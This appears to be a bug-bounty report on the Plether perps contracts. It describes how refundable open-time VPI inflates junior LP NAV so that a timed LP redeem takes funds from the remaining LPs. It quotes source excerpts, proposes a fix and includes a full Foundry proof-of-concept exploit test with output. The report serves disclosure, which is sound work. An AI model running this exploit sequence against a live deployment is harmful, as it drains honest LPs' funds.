# \#99207 [SC-Critical] Refundable open-time VPI is credited to junior NAV before the close returns it, so a timed LP exit takes value from the remaining LPs

**Submitted on Nov 12th 2026 at 12:08:39 UTC by @Nyksx for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99207
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

A skew-increasing open pays a VPI charge that the Engine books as LP revenue, and the next LP epoch settlement credits it to junior principal, although the same trader's close later refunds it through the lifetime VPI clamp. An actor who holds a large junior LP position and a trader account can open just before their matured redeem is priced, exit at the raised share price, and close afterwards, so that the refund is paid by the LPs who remain (6,307.64 USDG from an 11M USDG junior LP in one measured round trip). Severity is assessed as Medium (Medium impact, Medium likelihood), and the impact maps to the Immunefi row "Direct theft of user funds (other than unclaimed yield)", an impact Immunefi's table lists under Critical.

## Finding Description

VPI (the skew-dependent price impact charge) is stored per position as a signed lifetime balance, `vpiAccrued`. A positive `vpiAccrued` is value the pool has received and, through the lifetime clamp, returns when the position is closed, provided the close earns at least that rebate and the pool has the free cash to pay it. The pool counts that cash as LP equity from the moment it arrives, and LP entry and exit are priced from that equity. Between the open and the close, junior NAV therefore includes the outstanding positive `vpiAccrued`.

**1. The open charges VPI and records it as LP revenue.** The trade cost includes the signed VPI (`OpenAccountingLib.sol:127-135`):

```solidity
        (valid, state.vpiAssets) = CfdMath.tryCalculateVPI(
            inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.riskParams.vpiFactor
        );
        // ...
        state.executionFeeAssets = (state.notionalAssets * inputs.executionFeeBps) / 10_000;
        state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets); // @> VPI is part of the open cost
```

The settlement sidecar sends the non-protocol part of that cost to the pool as revenue and keeps the VPI on the position (`CfdEngineSettlementSidecar.sol:454-463`, `:517`):

```solidity
        if (delta.tradeCostAssets > 0) {
            uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
            if (poolCashInflowAssets > 0) {
                IHousePool(host.pool())
                    .recordClaimantInflow(
                        poolCashInflowAssets,
                        IHousePool.ClaimantInflowKind.Revenue, // @> refundable VPI recorded as LP revenue
                        IHousePool.ClaimantInflowCashMode.CashArrived
                    );
            }
        }
        // ...
                vpiAccrued: currentPosition.vpiAccrued + delta.posVpiAccruedDelta, // @> same VPI kept as a refundable accrual
```

**2. The reconcile has no term for outstanding VPI.** LP equity is physical assets plus the signed terminal price delta, minus trader claims (`libraries/HousePoolAccountingLib.sol:60-78`). The terminal delta comes only from the price book (`TerminalNavBookV2.sol:228-230`, `:349`), which by design excludes VPI:

```solidity
    function buildReconcileSnapshot(
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
    ) internal pure returns (ReconcileSnapshot memory snapshot) {
        uint256 terminalAssets = engineSnapshot.physicalAssets; // @> includes the VPI cash received at open
        uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets; // @> no liability for positive vpiAccrued
        int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets; // @> price PnL only
        // ...
        if (terminalAssets >= terminalLiabilities) {
            snapshot.distributable = terminalAssets - terminalLiabilities;
```

Revenue beyond any senior high-water-mark shortfall goes to junior principal (`libraries/HousePoolWaterfallAccountingLib.sol:154-158`):

```solidity
        if (nextState.seniorPrincipal > nextState.seniorHighWaterMark) {
            nextState.seniorHighWaterMark = nextState.seniorPrincipal;
        }

        nextState.juniorPrincipal += remaining; // @> the open VPI raises junior principal
```

**3. LP settlement prices redeems and deposits right after that reconcile, with no live fee.** `_settleLpEpoch()` reconciles and then snapshots `juniorPrincipal` as the pricing basis for matured redeems and deposits (`HousePool.sol:835-841`, `:914-916`). The live settlement fee is zero (`HousePool.sol:1147-1155`):

```solidity
        _reconcile(accountingSnapshot, statusSnapshot); // @> credits the open VPI to juniorPrincipal
        _checkpointEngineCarryIndexes();

        result.cutoffEpoch = cutoffEpoch;
        RedemptionPhase memory juniorPhase;
        juniorPhase.pricingPrincipal = juniorPrincipal; // @> redeem price includes the refundable VPI
        juniorPhase.pricingSupply = _juniorShareSupply();
        // ...
        DepositPhase memory juniorDepositPhase;
        juniorDepositPhase.pricingAssets = juniorPrincipal; // @> deposit price includes it as well
        // ...
    function _settlementFeeBps(
        bool isSenior,
        bool oracleFrozen
    ) internal view returns (uint256) {
        if (!oracleFrozen) {
            return 0; // @> no live LP entry/exit fee
        }
```

With open positions the Pool requires the Router as caller (`HousePool.sol:809-819`), but the Router entry point is open to anyone who supplies a Pyth update (`router/OrderLiquidationBatchLogic.sol:549-563`):

```solidity
    function settleLpEpoch(
        bytes[] calldata pythUpdateData
    ) external payable { // @> permissionless; any caller can trigger epoch settlement
        _requireDelegateCall();
        // ...
        IPletherOracle.PriceSnapshot memory snapshot =
            oracle.updatePrice{value: pythFee}(msg.sender, pythUpdateData, IPletherOracle.PriceMode.PoolReconcile);
        host.engine().updateMarkPrice(snapshot.markPrice, snapshot.publishTime);
```

**4. The close refunds the same VPI from pool cash.** Closing the position reverses the skew, so `calculateVPI()` returns a rebate. The lifetime clamp limits it to the accrued amount, which returns exactly the open charge on a full close (`libraries/CloseAccountingLib.sol:103-118`):

```solidity
        state.proportionalAccrualAssets =
            (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
        // ...
            state.vpiDeltaAssets = CfdMath.calculateVPI(
                inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
            );
        // ...
        if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
            state.vpiDeltaAssets = -state.proportionalAccrualAssets; // @> refund equals the accrued open VPI
        }
```

The net action amount (VPI rebate plus the close fee) becomes a rebate paid out of the pool (`libraries/CfdEnginePlanLib.sol:1041-1061`, `CfdEngineSettlementSidecar.sol:621-624`):

```solidity
        int256 actionNetAssets = cs.vpiDeltaAssets
            + int256(
                cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets
            );
        // ...
        } else if (actionNetAssets < 0) {
            delta.actionRebateAssets = uint256(-actionNetAssets); // @> VPI refund net of the close fee
        }
        // ...
        if (delta.actionRebatePaidAssets > 0) {
            IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets); // @> paid by current LPs
            clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
        }
```

**Conditions.** The open must increase skew, so that the VPI is positive, and must execute before an LP epoch boundary at which the actor has a matured junior redeem. The actor's share of junior equity at that settlement sets how much of the credited VPI they withdraw. The close can follow later, and the refund equals the open VPI when the close's VPI rebate is at least the accrued amount (for example, when skew is unchanged since the open) and enough free pool cash is available, since rebates are limited to free cash and the remainder is waived (`SECURITY.md:871-872`). 


## Impact Explanation

LPs who remain in the junior tranche lose principal to an LP who is priced while refundable VPI is counted as equity. In the PoC, one round trip at release parameters moves 6,307.64 USDG (about 0.057% of principal) from an honest 11M USDG junior LP, the attacker nets 2,507.44 USDG, and the 3,800.00 USDG open execution fee goes to the protocol treasury. Because VPI is `vpiFactor * skew^2 / (2 * depth)`, an open from zero skew to the 40% skew cap charges at most about 0.08% of pool depth, which bounds the amount credited per round trip. The remaining LPs are worse off once the exiting LP's share of junior equity exceeds about 21% (close fee / V = 3,800 / 18,050), and the attacker profits once its share exceeds about 42% (two fees / V = 7,600 / 18,050). 

## Likelihood Explanation

No privileged role is needed: the steps are an LP deposit and redeem request, a trader commit, keeper execution and the permissionless Router `settleLpEpoch()`, and the open executes before the epoch boundary, so no race with other settlers is involved. 


## Recommendation

Consider treating the outstanding positive lifetime VPI as a liability in the reconcile snapshot, so that refundable VPI enters LP equity only when the close settles it. Since positive `vpiAccrued` is an upper bound on what the clamp can refund, this is conservative when a rebate is later partially waived. 

## Proof of Concept

## Proof of Concept

The test deploys the production perps contracts through the repository's `BasePerpTest` fixture with the release risk parameters, release Router oracle settings, release pool caps and 1 USDG seeds. The fixture's `LegacyOrderRouterHarness` inherits `OrderRouter` and only adds a scalar `commitOrder()` overload, which this test does not use. The steps go through public entry points: `TrancheVault.requestDeposit()`/`claimDeposit()`/`requestRedeem()`/`claimRedeem()`, the V3 `commitOrder()` through `IPerpsTraderActions`, `executeOrder()` by a third-party keeper, and Router `settleLpEpoch()`. No call is pranked as the Router, Engine or Pool. Only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocked. The fixture's `PletherOracle` uses two equally weighted feeds rather than the six-leg production basket; both feeds stay at 1.00 for the whole run, so the basket composition does not affect the result.

Each test first runs a control in which the attacker deposits 14M USDG and redeems with no trade. It then reverts to a snapshot and runs the attack:

1. The attacker deposits 14M USDG and requests a full redeem after the deposit cooldown.
2. About one minute before the redeem epoch, the attacker opens a 9.5M LONG.
3. The epoch is settled.
4. The attacker claims the redeem and closes the position.

Finally, the honest LP (11M USDG) redeems. The second test repeats the scenario with 1 bp per-feed Pyth confidence.

Command (repository root, commit `a82d4fef`):

```bash
forge test --root packages/perps --match-path test/Submission_C04.t.sol -vv --offline
```

Key output (excerpt; `test_G1_OpenVpiRoundTripTakesValueFromOtherJuniorLps()`, zero confidence; USDG with 6 decimals):

```
  attack: vpiAccrued after open: 18049998556
  control: junior credited at settle: -18
  attack: junior credited at settle: 18049998538
  control: attacker LP redeemed: 13999999999989
  attack: attacker LP redeemed: 14010107998777
  attack: trader account net (open + close): -7600554351
  attacker net gain over control: 2507444437
  control: victim redeemed: 10999999999975
  attack: victim redeemed: 10993692356110
  victim loss vs control: 6307643865
  control: protocol treasury delta: 0
  attack: protocol treasury delta: 3800000000
```

The settlement credits the full 18,049.998 USDG open VPI to junior principal, and the attacker's redeem receives 10,107.999 USDG of it. The trader leg costs 7,600.554 USDG, the two 4 bps execution fees plus about 0.55 USDG, which shows that the close refunded the VPI. With 1 bp confidence (`test_G1_WithOneBpConfidence()`), the attacker gains 2,164.94 USDG and the honest LP loses 5,965.04 USDG. Both tests pass.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @title Submission G1: open-time VPI is credited to junior NAV before the close refunds it
/// @notice Scenario: an honest junior LP holds 11M USDG. The attacker deposits 14M USDG
///         as a junior LP, queues a full redeem, and shortly before the redeem epoch opens a 9.5M LONG (skew
///         increasing). The open-time VPI is booked as LP revenue and the next LP settlement credits it to junior
///         principal before pricing the matured redeem. The attacker then closes; the lifetime VPI clamp refunds the
///         same VPI, paid by the pool that the honest LP still owns.
/// @dev Every step uses public production entry points: TrancheVault request/claim, Router `commitOrder()` (V3
///      bounded surface), keeper `executeOrder()`, and Router `settleLpEpoch()` with a Pyth payload. A third-party
///      keeper executes all orders and settlements. No call is pranked as the Router, Engine, or Pool, and only Pyth
///      (MockPyth) and USDG (MockSettlementToken) are mocks. Release risk parameters, release Router oracle config
///      (minOpenNotional 1,000 USDG, adverseConfidenceMultiplierBps 2,500), release pool caps (40M, 8,000 bps),
///      execution fee 4 bps, settlement buffer 25 bps, and 1 USDG seeds are used.
contract Submission_C04 is BasePerpTest {

    address internal constant VICTIM = address(0xB0B);
    address internal constant ATTACKER_LP = address(0xA77A);
    address internal constant ATTACKER_TRADER = address(0xA77B);
    address internal constant KEEPER = address(0x4EE9E7);

    uint256 internal constant VICTIM_DEPOSIT = 11_000_000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 14_000_000e6;
    uint256 internal constant LOTS = 95_000; // 9.5M synthetic tokens at the 1e20 size quantum
    uint256 internal constant MARGIN = 300_000e6;
    uint256 internal constant TUESDAY_1400_UTC = 1_710_252_000; // 2024-03-12, live FX market

    OrderLifecycleBook internal lbook;
    uint256 internal clientNonce;
    uint256 internal conf; // per-feed Pyth confidence, 8 decimals

    struct Out {
        int256 vpiAccruedAtOpen; // position.vpiAccrued after the open
        uint256 juniorPrincipalBeforeSettle;
        int256 juniorCreditedAtSettle; // junior principal change from the reconcile inside settleLpEpoch()
        uint256 attackerRedeemed;
        int256 traderNet; // attacker trader account: open + close, all charges and refunds
        int256 attackerNet; // LP leg + trader leg, relative to the deposited capital
        uint256 victimRedeemed;
        uint256 treasuryDelta; // protocol treasury clearinghouse balance change over the run
    }

    // ------------------------------------------------------------------ release configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // packages/perps/DEPLOYMENT.md "Initial release parameters"
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // the victim deposits through the real Router settlement path in setUp()
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        lbook = router.lifecycleBook();
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = 1000e6;
        rc.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(rc); // 72 h timelocked owner config
        _setSeniorCapacity(40_000_000e6, 8000); // timelocked owner config
        _warpTo(TUESDAY_1400_UTC);
        vm.prank(KEEPER);
        router.updateMarkPrice(_payload(vm.getBlockTimestamp()));

        _lpDeposit(VICTIM, VICTIM_DEPOSIT);
    }

    // ------------------------------------------------------------------ helpers (public entry points only)

    function _payload(
        uint256 t
    ) internal view returns (bytes[] memory d) {
        MockPyth.FeedUpdate[] memory ups = new MockPyth.FeedUpdate[](2);
        ups[0].id = BASE_PYTH_FEED_A;
        ups[0].price = MockPyth.MockPrice({
            price: int64(1e8), conf: uint64(conf), expo: -8, publishTime: t, prevPublishTime: t - 1
        });
        ups[1].id = BASE_PYTH_FEED_B;
        ups[1].price = MockPyth.MockPrice({
            price: int64(1e8), conf: uint64(conf), expo: -8, publishTime: t, prevPublishTime: t - 1
        });
        d = new bytes[](1);
        d[0] = abi.encode(ups);
    }

    function _warpTo(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev Permissionless LP settlement through the Router with a current Pyth tick.
    function _routerSettle() internal {
        bytes[] memory d = _payload(vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.settleLpEpoch(d);
    }

    /// @dev Junior deposit: requestDeposit() -> Router settleLpEpoch() at the activation epoch -> claimDeposit().
    function _lpDeposit(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 reqId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        uint256 activation = juniorVault.depositEpochStart(reqId);
        if (vm.getBlockTimestamp() < activation) {
            _warpTo(activation);
        }
        _routerSettle();
        uint256 claimable = juniorVault.claimableDepositRequest(reqId, lp);
        assertEq(claimable, amount, "deposit settled in full");
        vm.prank(lp);
        juniorVault.claimDeposit(reqId, claimable, lp, lp);
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(vm.getBlockTimestamp() + 60);
        b.executionWindowSeconds = 60;
        b.allowedExecutionModes = 7;
        b.expectedConfigHash = lbook.currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.maxPostLeverageBps = type(uint32).max;
    }

    /// @dev Trader commitOrder() -> keeper executeOrder() with the first post-commit tick.
    function _commitAndExecute(
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory req;
        req.clientOrderId = bytes32(++clientNonce);
        req.side = CfdTypes.Side.LONG;
        req.sizeDelta = LOTS * 1e20;
        req.marginDelta = isClose ? 0 : MARGIN / 2;
        req.targetPrice = isClose ? type(uint256).max : 1;
        req.isClose = isClose;
        req.bounds = _bounds();
        vm.prank(ATTACKER_TRADER);
        uint64 id = IPerpsTraderActions(address(router)).commitOrder(req);
        uint256 commitTime = vm.getBlockTimestamp();
        _warpTo(commitTime + 2);
        bytes[] memory d = _payload(commitTime + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, d);
        require(r.status == OrderV3Types.LifecycleStatus.Executed, "order not executed");
    }

    // ------------------------------------------------------------------ scenario

    /// @param attack false = control (attacker LP deposits and redeems, no trade); true = open before the redeem
    ///        epoch and close right after the settlement.
    function _run(
        bool attack
    ) internal returns (Out memory o) {
        // 1. Attacker LP deposit, then a full redeem request after the 1 h deposit cooldown.
        _lpDeposit(ATTACKER_LP, ATTACKER_DEPOSIT);
        _warpTo(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 reqId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        uint256 e = pool.lpEpochStart(reqId);
        uint256 treasuryStart = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);

        _warpTo(e - 120);
        vm.prank(KEEPER);
        router.updateMarkPrice(_payload(vm.getBlockTimestamp()));

        // 2. Attack leg 1: skew-increasing open about one minute before the redeem epoch boundary.
        uint256 traderStart;
        if (attack) {
            _fundTrader(ATTACKER_TRADER, MARGIN);
            traderStart = clearinghouse.balanceAssets(ATTACKER_TRADER);
            _warpTo(e - 60);
            _commitAndExecute(false); // executes at e - 58 with the e - 59 tick
            (,,,,,, o.vpiAccruedAtOpen) = engine.positions(ATTACKER_TRADER);
        }
        o.juniorPrincipalBeforeSettle = pool.juniorPrincipal();

        // 3. Permissionless LP settlement: reconcile (credits the open VPI to junior), then redeem pricing.
        _warpTo(e + 1);
        _routerSettle();
        uint256 c = juniorVault.claimableRedeemRequest(reqId, ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        o.attackerRedeemed = juniorVault.claimRedeem(reqId, c, ATTACKER_LP, ATTACKER_LP);
        o.juniorCreditedAtSettle =
            int256(pool.juniorPrincipal() + o.attackerRedeemed) - int256(o.juniorPrincipalBeforeSettle);
        o.attackerNet = int256(o.attackerRedeemed) - int256(ATTACKER_DEPOSIT);

        // 4. Attack leg 2: full close; the lifetime clamp refunds the open VPI from the pool.
        if (attack) {
            _commitAndExecute(true);
            (uint256 sz,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(sz, 0, "position closed");
            o.traderNet = int256(clearinghouse.balanceAssets(ATTACKER_TRADER)) - int256(traderStart);
            o.attackerNet += o.traderNet;
        }

        // 5. The honest LP exits at the next epoch.
        uint256 vShares = juniorVault.maxRequestRedeem(VICTIM);
        vm.prank(VICTIM);
        uint256 vReq = juniorVault.requestRedeem(vShares, VICTIM, VICTIM);
        _warpTo(pool.lpEpochStart(vReq) + 1);
        _routerSettle();
        uint256 vc = juniorVault.claimableRedeemRequest(vReq, VICTIM);
        vm.prank(VICTIM);
        o.victimRedeemed = juniorVault.claimRedeem(vReq, vc, VICTIM, VICTIM);
        o.treasuryDelta = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasuryStart;
    }

    function _compare(
        uint256 confAtoms
    ) internal returns (Out memory ctl, Out memory atk, int256 gain, int256 loss) {
        conf = confAtoms;
        uint256 snap = vm.snapshotState();
        ctl = _run(false);
        vm.revertToState(snap);
        atk = _run(true);
        gain = atk.attackerNet - ctl.attackerNet;
        loss = int256(ctl.victimRedeemed) - int256(atk.victimRedeemed);

        emit log_named_uint("per-feed Pyth confidence (1e-8)", confAtoms);
        emit log_named_int("attack: vpiAccrued after open", atk.vpiAccruedAtOpen);
        emit log_named_int("control: junior credited at settle", ctl.juniorCreditedAtSettle);
        emit log_named_int("attack: junior credited at settle", atk.juniorCreditedAtSettle);
        emit log_named_uint("control: attacker LP redeemed", ctl.attackerRedeemed);
        emit log_named_uint("attack: attacker LP redeemed", atk.attackerRedeemed);
        emit log_named_int("attack: trader account net (open + close)", atk.traderNet);
        emit log_named_int("attacker net gain over control", gain);
        emit log_named_uint("control: victim redeemed", ctl.victimRedeemed);
        emit log_named_uint("attack: victim redeemed", atk.victimRedeemed);
        emit log_named_int("victim loss vs control", loss);
        emit log_named_uint("control: protocol treasury delta", ctl.treasuryDelta);
        emit log_named_uint("attack: protocol treasury delta", atk.treasuryDelta);
    }

    // ------------------------------------------------------------------ tests

    /// @notice Zero Pyth confidence: the attacker gains and the honest junior LP loses against the control run.
    function test_G1_OpenVpiRoundTripTakesValueFromOtherJuniorLps() public {
        (Out memory ctl, Out memory atk, int256 gain, int256 loss) = _compare(0);

        // Control: without the trade, the attacker LP leg is break-even (within rounding).
        assertApproxEqAbs(ctl.attackerRedeemed, ATTACKER_DEPOSIT, 1e6, "control: attacker redeems its deposit");

        // The skew-increasing open charges a positive VPI that stays on the position as a refundable accrual.
        assertGt(atk.vpiAccruedAtOpen, 18_000e6, "open VPI accrued on the position");

        // The reconcile inside settleLpEpoch() credits that VPI to junior principal before redeem pricing.
        assertGe(
            atk.juniorCreditedAtSettle,
            ctl.juniorCreditedAtSettle + atk.vpiAccruedAtOpen - 1e6,
            "open VPI credited to junior NAV"
        );

        // The close refunds the open VPI in full: the trader leg costs only the two 4 bps execution fees
        // (2 x 3,800 USDG) plus carry and the open execution bounty, i.e. far less than the VPI that was booked.
        int256 twoExecutionFees = 2 * 3800e6;
        assertLt(-atk.traderNet, twoExecutionFees + 10e6, "trader leg pays fees only; the VPI came back");
        assertGt(-atk.traderNet, twoExecutionFees - 1, "trader leg pays at least the execution fees");

        // Net effect of one round trip: attacker profits, the honest junior LP loses more than the attacker gains.
        assertGt(gain, 2000e6, "attacker profits from the round trip");
        assertGt(loss, 6000e6, "honest junior LP loses");
        assertGt(loss, gain, "victim loss exceeds attacker gain");
    }

    /// @notice Same scenario with 1 bp per-feed Pyth confidence (adverse confidence shift active on execution).
    function test_G1_WithOneBpConfidence() public {
        (,, int256 gain, int256 loss) = _compare(1e4);
        assertGt(gain, 0, "attacker still profits");
        assertGt(loss, 5000e6, "honest junior LP still loses");
    }

}
```
